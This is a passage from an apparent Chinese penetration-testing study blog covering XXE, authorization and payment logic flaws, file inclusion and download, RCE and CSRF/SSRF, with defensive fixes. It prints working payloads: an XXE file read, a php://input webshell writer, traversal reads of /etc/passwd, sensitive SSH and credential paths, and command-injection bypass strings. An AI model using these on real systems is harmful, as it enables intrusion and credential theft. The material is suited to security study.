先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程主机上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。 进一步对XXE漏洞分析后，我们可以很清晰地看到我们实际上都是通过file协议读取本地文件，或者通过http协议发出请求，类比一下其他漏洞例如SSRF，发现这两种漏洞的利用方式非常相似，因为他们都是从服务器向另一台服务器发起请求，所以想要更进一步的利用XXE漏洞我们要清楚在何种平台可以使用何种协议： libxml2 PHP JAVA .NET filehttpftp filehttpftpphpcompress.zlibcompress.bzip2dataglobphar httphttpsftpfilejarnetdocmailtogopher * filehttphttpsftp 防御 使用开发语言提供的禁用外部实体的方法 123456789PHP： libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance()；dbf.setExpandEntityReferences(false);Python: from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据 过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC 使用第三方应用代码及时升级补丁 实操 发现漏洞 从上面可以看到：XML的数据传输。则在传输数据的地方贴上payload。 123456789&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Mikasa [&lt;!ENTITY test SYSTEM &quot;file:///e:/you.txt&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;&lt;!-- 注： file:///c:/ 和 file:/// 分别是windows 和 Linux的r--&gt;&lt;!-- 回显 --&gt;what?(我的文本) 更改类型（盲猜） 原代码 12345678910111213POST /api/v1.0/try HTTP/1.1Host: web.jarvisoj.com:9882Content-Length: 36User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36Content-Type: application/jsonAccept: */*Origin: http://web.jarvisoj.com:9882Referer: http://web.jarvisoj.com:9882/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&#123;&quot;search&quot;:&quot;type sth!&quot;,&quot;value&quot;:&quot;own&quot;&#125; 改 123456789101112131415161718POST /api/v1.0/try HTTP/1.1Host: web.jarvisoj.com:9882Content-Length: 104User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36Content-Type: application/xmlAccept: */*Origin: http://web.jarvisoj.com:9882Referer: http://web.jarvisoj.com:9882/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Mikasa [&lt;!ENTITY test SYSTEM &quot;file:///flag.txt&quot;&gt;]&gt;&lt;x&gt;&amp;test;&lt;/x&gt; JAVA webgoat","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://j3f5.github.io/tags/XXE/"}]},{"title":"逻辑漏洞","slug":"逻辑漏洞","date":"2023-06-03T02:40:31.000Z","updated":"2023-06-03T02:40:31.000Z","comments":true,"path":"articles/2023/06/03/逻辑漏洞/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/03/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"水平垂直越权 概念 水平：A与B是同一个权限，但是A可以访问B的数据 垂直：B是高权限用户，而A是低权限，A可以访问B的数据 未授权访问：通过删除请求中的认证信息后，发起 重放攻击 仍然可以访问或者完成操作 挖洞关键 找到功能点，当然也可能不是功能点，就是刷新之后返回的一些信息，通过各种参数查询数据库啥的，抓包一个个放，然后看有什么可以利用的 抓包查看有什么地方可以修改的，例如如下card_id、uid等等都是可以改的 12345678910GET /json.php?card_id=20128880322 HTTP/1.1Host: 124.70.64.48:47325User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: http://124.70.64.48:47325/user_info.phpCookie: PHPSESSID=2a14ujvvjk9puum9qvpelkaae2; uid=test; mid=6927071f788211ee17211be0b89ef1e6Cache-Control: max-age=0 去找你想要相关User的信息，一般可以通过头像的命名方式之类的，与card_id有关系的命名，然后得到一些信息。改一下就重新发包，观察得到了什么信息。 所以总结一下，一些Uid啥的都是很有用的，需要注意搜集 水平越权操作 看一下A中可以实现的功能，然后，抓包。【例如：账户名Kobe，然后有个查看信息的操作】 看抓包中的参数，更改参数。【例如想查看账户Lucy的详细信息，更改http://.../?name=kobe&amp;submit=...中kobe变成lucy】 怎么知道有Lucy这个人？信息搜集+注册框显示是否存在此用户+访问其他个人空间查看用户名 如果返回成功，那就存在水平越权 垂直越权操作 先去admin界面操作并抓到包/看到相关界面（例如在普通用户界面有的按钮是灰色，然后猜解数据包的构成） 更换猜解/抓到的admin操作数据包，然后替换普通用户的cookie 如果操作成功，那就存在垂直越权漏洞 前提条件：（获取admin的操作数据包，那么怎么来的数据包？） 普通用户前端有操作界面可以抓取操作数据包 通过网站源码本地搭建模拟抓取 盲猜 原理 即：验证是产生在哪个地方的。所以：如果在访问数据包的时候有传输用户的编号，用户组编号或者类型编号，那么尝试对这个值进行修改，就是测试越权漏洞的基本。 前端安全造成——界面 即前端验证是否有这个权限去执行这个操作，然后放行或者禁止。所以后端不做验证直接全盘接受，如果前端伪造，那么就会有这样的漏洞。其实可以算是后端代码逻辑错误，例如：php代码没有验证是什么权限，只是验证是否登录。 后端安全造成——数据库 通过验证usertype来确定用户权限。 id, username, password, usertype 1, admin, 123456, 1 2, xiaodi, 365567, 2 工具 secscan-authcheck：https://github.com/ztosec/secscan-authcheck 小米范：http://pan.baidu.com/s/1pLjaQKF (privilegechecker)。他就是多个窗口，省了你切换窗口的麻烦。 Authz：Burp的插件 直接在官方那下 登录爆破与支付数据篡改 登录功能点安全问题 爆破测试 一般来说http传输数据流量的时候是不加密传输的，而Https是加密传输的。例如用户名密码，baidu的密码就是经过加密的。但是也不绝对，https不一定对密码进行加密操作，而Http也可能对密码进行加密。 然而，它也是可以被爆破的，md5什么的可以直接爆破。 cookie 验证cookie有误，例如： 【白盒】仅仅验证是否存在COOKIE且COOKIE中的USER是否有值，有的话就放行。这样是不行的。我只要伪造一个USER，随便输入什么东西就绕过了。 【黑盒】收到包，看COOKIE中的值是否是可以操作的，就随便改，碰运气 综合考虑 字典应该如何设置，是结合信息搜集还是用top100字典 验证码如何绕过，图片or数字验证码 登录次数限制 综合考虑多个问题 数据篡改安全 物品购买流程 订购、确认信息、付款 常见篡改参数 商品ID、购买价格/优惠券、订单信息 常见篡改方法 替换支付、重复支付、最小额度支付、负数支付、溢出支付、优惠券支付… 支付接口 1234index.php?s=/wap/pay/wchatQrcodePay //微信支付index.php?s=/wap/pay/alipay //支付宝支付index.php?s=http://www.xiaodi8.com/alipay //调用其他的支付接口payname= pay_name=payname=_GET[‘s’]; 找回机制与接口 找回机制 客户端回显：有时候发送邮箱验证码，会通过包来发送，验证码就藏在发送包的内容中，甚至是图片标签里面就有验证码 Response 状态值：有时候验证完验证码后，服务器会发送Res，里面包含一个CODE，表达是否验证成功，这个时候，我们可以通过Burp拦截回显包，修改CODE值，看看时候是正确的。（当然我们得提前知道这个CODE是什么值的时候是正确的） 验证码爆破：一般4位数数字验证码是可以爆破的 找回流程绕过/更改找回流程 通常发生在邮件/手机的验证码绕过。当发送了包，替换原号码为我们的手机号来收验证码。然后把验证码写上就行。 还有一种是，邮箱收到找回密码的URL，注意观察这个URL有一些参数值是可以改的，改了它看能不能实现跨用户的密码重置。当然，这会有其他问题出现，例如，如何去改这个参数（这个参数如何构成的） 接口攻击（后面会详细） 短信轰炸 来电轰炸 验证码、token与接口 验证码安全 分类：图片，手机或邮箱，语音，视频，操作等 原理：验证生成或验证过程中的逻辑问题 危害：账户权限泄漏，短信轰炸，遍历，任意用户操作等 漏洞：客户端回显(已讲)，验证码复用，验证码爆破(已讲)，绕过等 验证码识别插件工具使用 captcha-killer，Pkav_Http_Fuzz，reCAPTCHA 等 token 安全 基本上述同理，主要是验证中可存在绕过可继续后续测试 token 爆破，token 客户端回显等 客户端访问服务器, 服务器返回一个签名的token给客户端, 服务器和客户端各自保存token。以后每次请求服务器都会携带token token的主要作用： 防止表单重复提交 身份验证 接口安全 调用，遍历，未授权，篡改等 调用案例：短信轰炸 遍历案列：UID 等遍历 callback 回调 JSONP （看跨域共享~） 参数篡改：墨者靶场 防御措施 前后端双重检测 资源 涉及资源 爆破字典：https://github.com/huyuanzhi2/password_brute_dictionary 业务逻辑文章：https://cloud.tencent.com/developer/article/2091084 漏洞文章图","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"业务逻辑","slug":"业务逻辑","permalink":"https://j3f5.github.io/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"}]},{"title":"文件包含与下载读取基础","slug":"文件包含与下载读取基础","date":"2023-06-02T08:00:56.000Z","updated":"2023-06-02T08:00:56.000Z","comments":true,"path":"articles/2023/06/02/文件包含与下载读取基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/","excerpt":"","text":"文件包含 即一次包含之后就不用再重新写相关代码，直接调用即可。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，这样，如果我们能控制这些参数，就可以进行文件包含。 利用： 有相关的包含函数 该函数内参数可控 常见代码以及脚本函数 造成包含的常见脚本代码 1234567891011&lt;!--#include file=&quot;1.asp&quot; --&gt;&lt;!--#include file=&quot;top.aspx&quot; --&gt;&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;&lt;jsp:include page=&quot;head.jsp&quot;/&gt;&lt;%@ include file=&quot;head.jsp&quot;%&gt;&lt;?php include(&#x27;test.php&#x27;)?&gt; 脚本函数 PHP include()：当使用include()函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。 include_once()：include_once 语句在脚本执行期间包含并运行指定文件。此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 include_once 会返回 true。 include_once()：可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题 require()：当使用require()函数包含文件时，只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行。 require_once()：require_once表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 检测 这里的检测也分白盒黑盒，都差不多老三样 白盒：代码审计 黑盒 公开漏洞 漏扫工具 手工查看参数和功能点 类型与绕过 类型 远程包含（RFI） 本地包含（LFI） 绕过 本地有限制包含 %00截断 条件：magic_quotes_gpc = Off php版本&lt;5.3.4 路径长度截断 条件：windows OS，点号需要长于256；linux OS 长于4096 Windows下目录最大长度为256字节，超出的部分会被丢弃； Linux下目录最大长度为4096字节，超出的部分会被丢弃。 ​ 点号.截断 条件：windows OS，点号需要长于256 远程有限制包含 PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 12allow_url_fopen = On（是否允许打开远程文件）allow_url_include = On（是否允许include/require远程文件） 1234&lt;?php $filename = $_GET[&#x27;filename&#x27;]; include($filename.&quot;.html&quot;);?&gt; 这个限制了包含文件的格式。但是可以绕过。 使用?号：www.xxx.com/include.php?filename=myfile.php? 即把后面的当做参数 使用#(%23)：www.xxx.com/include.php?filename=myfile.php%23 即把后面的当做HTML标签 使用 空格(%20)：www.xxx.com/include.php?filename=myfile.php%20 利用 - php java curl(ssrf) asp 利用 http/https √ √ √ √ gopher √ before JDK1.7 before 7.49.0 不支持\\x00 before version 3 ftp √ √ √ √ file √ √ √ √ dict –with-curlwrappers × √ × imap/pop3 –with-curlwrappers × √ × rtsp –with-curlwrappers √ √ √ smb –with-curlwrappers √ √ √ smtp –with-curlwrappers × √ × telnet –with-curlwrappers × √ × ssh2 受限于allow_url_fopen × × × ogg 受限于allow_url_fopen × × × ldap × × × × php √ × × × zlib/bzip2/zip 受限于allow_url_fopen × × × PHP专属伪协议 协议 allow_url_fopen allow_url_include 用法 file:// off/on off/on ?file=file:///user/desktop/file.txt php://filter off/on off/on ?file=php://filter/read=convert.base64-encode/resource=./index.php php://input off/on on ?file=php://input[POST DATA] &lt;?php phpinfo()?&gt;注：当enctype=”multipart/form-data”时，php://input是无效的。常用：http://127.0.0.1/include.php?file=php://input&lt;br/&gt;[POST DATA部分]&lt;br/&gt;&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt; compress.bzip2:// off/on off/on ?file=compress.bzip2://D:/soft/phpStudy/WW/file.bz2[or]?file=compress.bzip2://./file.bz2 compress.zlib:// off/on off/on ?file=compress.zlib//D:/soft/phpStudy/WWW/filegz[or]?file=compress.zlib://./file.gz data:// on on ?file=data://text/plain,&lt;?php phpinfo()?&gt;[or]?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=也可以:?file=data:text/plain,&lt;?php phpinfo0?&gt;[or]?file=data:text/plain:base64,PD9waAacGhwaW5mbyapPz4= http:// filter:// php://filter/read=convert.base64-encode/resource=[文件名]http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php phar:// 步骤：写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 再用解压函数phar解压即可：?file=phar://压缩包/内部文件 zip:// 相反，这个是压缩函数。用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] 。例如：zip://xxx.png#shell.php PHP伪协议 事实就是支持的协议和封装的协议12种 1234567891011file:// - 访问本地文件系统http:// - 访问http网站ftp:// - 访问FTP（s）URLSphp:// - 访问各个输入输出流zlib:// - 压缩流data：// - 数据（RFC 2397）glob：// -查找匹配的文件路径模型ssh2：// - Secure Shell 2rar:// - RARogg:// - 音频流expect:// - 处理交互式的流 php.ini参数设置 在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。 allow_url_fopen:默认值是ON。允许url里的封装协议访问文件； allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件； 修复 文件下载 注意区别： 文件被解析：文件包含 显示源代码：文件读取 提示文件下载：文件下载 一般链接形式与攻击思路 抓URL，看URL上有什么下载形式的URL 就是在一些下载按钮那，然后你改一下下面的链接就可以下载其他文件了。例如提取下载链接：http://..../?s=asdfagqrebvz==是个base64，我们下载一个文件，观察其文件名，然后把后面的Base64解码，看目录，对应着文件名就可以实现任意文件下载了。 123456download.php?path=download.php?file=down.php?file=data.php?file=readfile.php?file=read.php?filename= 包含参数 1234567891011121314151617181920&amp;RealPath=&amp;FilePath=&amp;ﬁlepath=&amp;Filepath=&amp;Path=&amp;path=&amp;inputFile=&amp;Inputfile=&amp;url=&amp;urls=&amp;Lang=&amp;dis=&amp;data=&amp;Data=&amp;readﬁle=&amp;ﬁlep=&amp;src=&amp;menu=META-INFWEB-INF 漏洞利用 任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。 1234index.php?f=…/…/…/…/…/…/etc/passwdindex.php?f=…/index.phpindex.php?f=ﬁle:///etc/passwdreadfile.php?file=/etc/passwd 常见文件&amp;敏感文件 后台首页日志等可见文件（常见） 数据库配置文件 各种接口文件 密钥信息等文件 常见的敏感文件路径 Windows C:\\boot.ini //查看系统版本 C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\Windows\\repair\\sam //存储系统初次安装的密码 C:\\Program Files\\mysql\\my.ini //Mysql配置 C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php配置信息 C:\\Windows\\my.ini //Mysql配置信息 C:\\Windows\\win.ini //Windows系统的一个基本系统配置文件 Linux /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去 /root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub /root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥 /root/.ssh/known_hosts //记录每个访问计算机用户的公钥 /etc/passwd //账户信息 /etc/shadow //账户密码文件 /etc/my.cnf //mysql配置文件 /etc/httpd/conf/httpd.conf //apache配置文件 /root/.bash_history //用户历史命令记录文件 /root/.mysql_history //mysql历史命令记录文件 /proc/mounts //记录系统挂载设备 /porc/config.gz //内核配置文件 /var/lib/mlocate/mlocate.db //全文件路径 /porc/self/cmdline //当前进程的cmdline参数 /usr/local/app/php5/lib/php.ini //PHP配置文件 漏洞修复 部署WAF产品 过滤.，使用户在url中不能回溯上级目录 正则严格判断用户输入参数的格式 配置限定文件访问范围，目录权限设置或单独文件权限设置 将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：http://www.test.com/download?filename=文件名 净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。 任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，需更新其中间件的版本可修复。 要下载的文件地址保存至数据库中。 文件路径保存至数据库，让用户提交文件对应ID下载文件。 用户下载文件之前需要进行权限判断。 文件放在web无法直接访问的目录下。 不允许提供目录遍历服务。 公开文件可放置在web应用程序下载目录中通过链接进行下载。 记录文件下载日志。 文件读取 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。 漏洞产生原因： 任意语言代码读取功能函数 文件读取函数：readfile()、file_get_contents()、fopen()中 $filename没有经过校验或者校验不合格 用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini 漏洞检测 手工查看参数值及功能点（资源下载） 漏洞利用 readfile.php?f=../../../../../../etc/passwd 读取文件：配置文件（数据库，平台，各种敏感文件等） 实例 java web目录 [RoarCTF 2019]Easy Java 一般来说，java web的配置文件必定存在于网页目录：WEB-INF/web.xml，里面有路由以及对应的servlet名等。 Tricks： GET下载不了就换成POST。注意：单纯的修改是不行的，需要用Hackbar发送一个POST包才行。 java WEB-INF/web.xml文件泄露。所有源码文件都在class文件里，组件com.???.???实际上是文件夹com/???/???。 小米路由CNVD漏洞 任意文件读取可以登录后台。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"文件读取","slug":"文件读取","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"RCE基础-代码执行&命令执行","slug":"RCE基础-代码执行&命令执行","date":"2023-06-02T00:56:20.000Z","updated":"2023-06-02T00:56:17.000Z","comments":true,"path":"articles/2023/06/02/RCE基础-代码执行&命令执行/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/02/RCE%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"RCE概述 RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。分为两类： 代码执行 因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞 命令执行 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 注意的是，如果想要挖掘这样的漏洞，如果这个网站本身不需要这些功能，那么基本上就没有这些漏洞出现。所以此漏洞可利用的条件： 有该拓展环境 漏洞函数 可控变量 RCE函数相关 PHP 代码执行 eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort() eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。 命令执行 system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、反引号与$() 有回显（执行并回显） 12&lt;?php system(&#x27;ls&#x27;);?&gt;&lt;?php passthru(&#x27;ls&#x27;);?&gt; 无回显（执行但不回显） 12345&lt;?php echo &quot;&lt;pre&gt;&quot;; echo exec(&#x27;ls&#x27;); echo &quot;&lt;/pre&gt;&quot;;?&gt; 12345&lt;?php echo &quot;&lt;pre&gt;&quot;; echo shell_exec(&#x27;ls&#x27;); echo &quot;&lt;/pre&gt;&quot;;?&gt; JAVA（命令执行） 在Java 开发语言中可以执行系统命令的函数有： Runtime.getRuntime.exec ProcessBuilder.start 其中，Runtime.getRuntime.exec 是在Java1.5 之前提供的，Java1.5 之后则提供了ProcessBuilder 类来构建进程 ProcessBuilder Java.lang.ProcessBuilder 类用于创建操作系统进程，每个ProcessBuilder 实例管理一个进程属性集。start() 方法利用这些属性创建一个新的Process 实例， 可以利用ProcessBuilder 执行命令。 ProcessBuilder 执行命令的方式如下： 12ProcessBuilder pb = new ProcessBuilder(&quot;myCommand&quot;, &quot;myArg&quot;); //ProcessBuilder p = new ProcessBuilder(&quot;ls&quot;,&quot;-al&quot;);Process process = pb.start(); Runtime.getRuntime java.lang.Runtime 公共类中的exec()方法同样也可以执行系统命令，exec()方法的使用方式有以下6 种： 123456789101112//在单独的进程中执行指定的字符串命令public Process exec(String command)//在单独的进程中执行指定的命令和参数public Process exec(String[] cmdarray)//在具有指定环境的单独进程中执行指定的命令和参数public Process exec(String[] cmdarray, String[] envp)//在具有指定环境和工作目录的单独进程中执行指定的命令和参数public Process exec(String[] cmdarray, String[] envp, File dir)//在具有指定环境的单独进程中执行指定的字符串命令public Process exec(String command, String[] envp)//在具有指定环境和工作目录的单独进程中执行指定的字符串命令public Process exec(String command, String[] envp, File dir) 正常执行： 1Process proc = Runtime.getRuntime().exec(&quot;ping 127.0.0.1&quot;); 与ProcessBuilder不同的是，如果他要执行多条命令，则需要输入数组，而非简单拼接： 123Process proc = Runtime.getRuntime().exec(&quot;ping 127.0.0.1;ls&quot;);//运行错误String[] command = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping -t 3 127.0.0.1;id&quot;&#125;;Process pro = Runtime.getRuntime().exec(command);//执行成功，他是直接调用了ProcessBuilder执行 所以产生拼接的命令执行漏洞就得按上面的写法，不然还不能拼接~ 除此之外，使用这个函数还有很多需要注意的点： 字符串执行需要替换空格（$&#123;IFS&#125;、$IFS$9）： 如果exec 方法执行的参数是字符串参数，参数中的空格会经过StringTokenizer 处理，处理完成后会改变原有的语义导致命令无法正常执行。例如： 12345cmd=sh -c ls;cat /etc/passwd //执行失败cmd=sh -c ls;id //执行成功cmd=sh -c ls;cat$&#123;IFS&#125;/etc/passwd //执行失败，因为我们的请求中包含无效的字符&#123;&#125;，它不属于保留字符，所以出错！cmd=sh%20-c%20ls;cat$%7BIFS%7D/etc/passwd //编码后执行成功，当然也可以使用$IFS$9 挖掘与防范 挖掘 黑盒测试：网站中有特殊功能，比如Ping、数据库备份等等。 白盒测试：查看命令执行函数是否做过滤。命令执行函数上述有提到 后面将会讲到其他漏洞的复现 防范 敏感函数禁用，尽量不要使用命令执行函数，不能完全控制的危险函数最好不使用。 在进入执行命令函数前进行严格的检测和过滤； 部署WAF 多使用安全API，而不直接利用命令执行函数 利用与绕过 代码注入 利用：利用后端脚本的特殊性对服务器进行攻击。 PHP： phpinfo可以获取到很多信息。例如收集绝对路径**，真实ip，绕过xss的httponly($_SERVER[“HTTP_COOKIE”])，存在oci8推测数据库可能为oracle。 eval写一句话木马getshell之类的。 其绕过方式一般都是替换关键字、关键字大小写、编码等等过滤了PHP代码，可以使用=绕过：&lt;?=eval($_REQUEST['cmd']);?&gt; 【更加详细内容可以去看：WAF绕过-一般性绕过总结】 命令注入 利用该漏洞实际上就是通过管道符、拼接符等方式进行命令注入而达到攻击的目的。 这里写绕过姿势： 黑名单绕过： 关键字绕过 双引号：l''s 反斜杠：l\\s 倒过来写：tac == cat 替换： cat可以由以下来代替 (1)more:一页一页的显示的显示档案内容 (2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页 (3)head:查看头几行 (4)tac:从最后一行开始显示,可以看出tac是cat的反向显示 (5)tail:查看尾几行 (6)nl:显示的时候,顺便输出行号 (7)od:以二进制的方式读取档案内容 (8)vi:一种编辑器，这个也可以查看 (9)vim:一种编辑器,这个也可以查看 (10)sort:可以查看 (11)uniq:可以查看 (12)file -f:报错出具体的内容 (13)base64:输出然后自己解码就好 空格绕过 &lt;&gt;重定向：cat&lt;flag_123 $IFS$9, $&#123;IFS&#125;空字符 逗号与{}：&#123;cat,flag_123&#125; 管道符&amp;，;，|等被过滤（注意，windows不支持;） linux: %0a 回车 %0d 换行 windows: %0a 回车 %1a 作为.bat文件的命令分隔符 其他 管道符的含义 Window系列支持的管道符如下所示。 &quot; | &quot;:直接执行后面的语句。例如：ping 127.0.0.1 | whoami。 “ || ”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 127.0.0.1 || whoami &quot; &amp; &quot; :如果前面的语句为假则直接执行后面的语句,前面的语句可真可假。例如： ping 127.0.0.1 &amp;whoami。 “ &amp;&amp; ”： 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1 &amp;&amp; whoami。 Linux 系统支持的管道符如下所示： “；”执行完前面的语句再执行后面的。例如: ping 127.0.0.1;whoami “ | ”：显示后面语句的执行结果。例如: ping 127.0.0.1 | whoami。 “ || ”： 当前面的语句执行出错时，执行后面的语句。例如： ping 1|| whoami。 “ &amp; ”： 如果前面的语句执行为假则直接执行后面的语句。前面的语句可真可假。例如：ping 127.0.0.1 &amp; whoami。 “ &amp;&amp; ”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： ping 127.0.0.1 &amp;&amp; whoami。 POC与EXP POC是验证 EXP是利用 TIPS 一般使用base64输出文件内容，因为有的字符没办法在屏幕上看见","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://j3f5.github.io/tags/RCE/"}]},{"title":"CSRF与SSRF漏洞基础","slug":"CSRF与SSRF漏洞基础","date":"2023-06-01T06:59:49.000Z","updated":"2023-06-01T06:59:49.000Z","comments":true,"path":"articles/2023/06/01/CSRF与SSRF漏洞基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/01/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/","excerpt":"","text":"CSRF 概念以及原理 Cross Site Request Forgery，跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击。 顾名思义，也就是在a.com可以执行（发送）b.com的请求，例如请求b.com删除某个数据。 详细： 攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作 XSS 利用站点内内的信任用户，盗取cookie，CSRF通过伪装成受信任用户请求受信任的网站，利用目标用户的合法身份，以目标的名义执行某些非法参数 利用条件： 已经登录系统 用户访问URL 已存在的网站中让用户跳转 防御 当用户发送重要的请求时输入验证码 设置随机TOKEN —数据包的唯一值 检测referer来源，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败） 限制请求方式只能为post。因为URL跳转一般都是GET，如果限制只能为POST，那么跳转不了，因为带不了数据包块 SSRF 概念、原理与相关注意点 Server-Side Request Forgery，服务器端请求伪造)，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 攻击目标：SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 形成原因：由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。 可能出现的地方 可能出现的地方 